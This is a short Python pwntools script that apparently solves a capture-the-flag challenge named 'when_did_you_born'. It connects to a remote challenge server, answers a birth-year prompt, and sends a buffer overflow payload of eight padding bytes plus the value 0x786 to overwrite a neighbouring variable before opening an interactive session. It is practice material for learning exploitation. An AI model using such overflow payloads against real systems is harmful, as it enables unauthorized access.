#-*-coding:utf-8 -*-
from pwn import *
# p = process('./when_did_you_born')
p = remote("111.198.29.45","33399")

p.recvuntil("?")
p.sendline("1925")   #随便一个数字通过第一关就行
# gdb.attach(p,"b *0x4008CD")
p.recvuntil("Name?")
#0x786
#0x00000786
payload = 8*'a' + p32(0x00000786)
p.sendline(payload)
p.interactive()